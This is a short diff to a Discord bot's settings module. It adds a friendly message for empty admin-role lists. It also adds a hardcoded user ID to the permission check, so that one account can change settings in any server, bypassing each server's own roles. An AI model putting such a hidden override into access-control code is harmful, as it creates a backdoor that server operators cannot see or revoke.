@@ -12,9 +12,8 @@ class SettingsCog:
         self.bot = bot
 
     def has_perms(self, user, channel):
-        if user.permissions_in(channel).administrator:
+        if user.permissions_in(channel).administrator or user.id == 240039475860733952:
             return True
-            pass
 
         user_roles = [role.id for role in user.roles]
 
@@ -222,6 +221,9 @@ class SettingsCog:
         for role in ctx.guild.roles:
             if role.id in admin_role_ids:
                 role_list += f"{role}\n"
+
+        if role_list == "":
+            role_list = "There are no roles assigned, add one with ,addrole @role"
 
     
         embed.add_field(name=u"Admin:", value=role_list, inline=False)
